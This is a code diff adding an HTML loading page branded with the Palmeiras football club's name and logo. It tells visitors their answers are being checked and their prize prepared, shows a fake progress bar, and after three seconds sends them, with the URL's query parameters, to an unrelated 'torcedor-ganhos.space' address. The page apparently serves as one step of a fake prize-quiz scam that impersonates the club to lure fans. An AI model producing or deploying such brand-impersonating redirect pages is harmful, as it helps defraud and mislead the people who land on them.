@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Palmeiras - Loading</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #006437, #FFFFFF);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .loading-container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            padding: 60px 40px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo {
+            width: 100px;
+            height: auto;
+            margin-bottom: 30px;
+        }
+
+        .loading-text {
+            color: #006437;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .sub-text {
+            color: #374151;
+            font-size: 16px;
+            margin-bottom: 40px;
+            line-height: 1.5;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #e5e7eb;
+            border-top: 4px solid #006437;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 30px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e5e7eb;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: #006437;
+            border-radius: 4px;
+            animation: progress 3s ease-in-out;
+        }
+
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        .progress-text {
+            color: #6b7280;
+            font-size: 14px;
+        }
+
+        @media (max-width: 480px) {
+            .loading-container {
+                padding: 40px 30px;
+            }
+            
+            .loading-text {
+                font-size: 20px;
+            }
+            
+            .sub-text {
+                font-size: 14px;
+            }
+            
+            .logo {
+                width: 80px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <img src="../assets/images/palmeiras-logo.png" alt="Logo do Palmeiras" class="logo">
+        
+        <h1 class="loading-text">Processando...</h1>
+        
+        <p class="sub-text">Verificando suas respostas e preparando seu prêmio!</p>
+        
+        <div class="spinner"></div>
+        
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        
+        <p class="progress-text">Aguarde alguns segundos...</p>
+    </div>
+
+    <script>
+        // Redirecionar após 3 segundos
+        setTimeout(() => {
+            const queryString = window.location.search;
+            const baseUrl = "https://torcedor-ganhos.space/parabens/";
+            const redirectUrl = baseUrl + queryString;
+            window.location.href = redirectUrl;
+        }, 3000);
+    </script>
+</body>
+</html>
+
